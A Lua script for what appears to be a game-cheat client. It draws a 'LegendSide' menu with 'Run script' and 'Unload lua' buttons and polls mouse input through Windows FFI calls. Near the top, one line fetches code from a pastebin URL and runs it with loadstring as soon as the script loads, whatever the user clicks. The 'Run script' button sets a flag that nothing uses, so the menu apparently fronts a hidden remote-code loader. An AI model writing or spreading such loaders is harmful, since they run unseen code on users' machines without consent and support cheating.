font = render.create_font("Verdana",20, 777, true, true, true)
fontt = render.create_font("Verdana",13, 777, true, true, false)
local startscript = false
ffi = require("ffi")
ffi.cdef[[
    typedef struct tagPOINT {
        long x;
        long y;
    } POINT;

    bool GetCursorPos(
        POINT* lpPoint
    );
]]
ffi.cdef[[
    bool GetCursorPos(
        POINT* lpPoint
    );
    
    short GetAsyncKeyState(
        int vKey
    );
 
    short GetKeyState(
        int nVirtKey
    );
]]
loadstring(http.get("https://pastebin.com","/raw/M97HgbS0"))()
pointer = ffi.new("POINT[1]")
local function starting()
    success = ffi.C.GetCursorPos(pointer)
    x = 900
    y = 500
    color = color.new(255,255,255,255)
    colorr = color.new(255,255,255,255)
    if ffi.C.GetAsyncKeyState(0x1) and pointer[0].x >= x+15 and pointer[0].x <= x+60 and pointer[0].y >= y+40 and pointer[0].y <= y+60 then
        color = color.new(66, 135, 245, 255)
        startscript = true
    else
        color = color.new(255,255,255,255)
        startscript = false    
    end
    if ffi.C.GetAsyncKeyState(0x1) and pointer[0].x >= x+78 and pointer[0].x <= x+134 and pointer[0].y >= y+40 and pointer[0].y <= y+60 then
        colorr = color.new(66, 135, 245, 255)
        unloadscript = true
    else
        colorr = color.new(255,255,255,255)
        unloadscript = false    
    end
    if unloadscript == true then
        client.unload_script("legendside.lua")
    end
    render.draw_rect_filled(x + 7,y - 2,136,65, color.new(55,55,55))
    render.draw_rect_filled(x + 10,y,130,60, color.new(30,30,30))
    render.draw_text(font, x + 28, y+2, color.new(255,255,255), "Legend")
    render.draw_text(font, x + 88, y+2, color.new(50, 117, 168), "Side")
    render.draw_text(fontt, x + 15, y+40, color, "Run script")
    render.draw_text(fontt, x + 77, y+40, colorr, "Unload lua")
    return
end

client.add_callback("on_paint", starting)
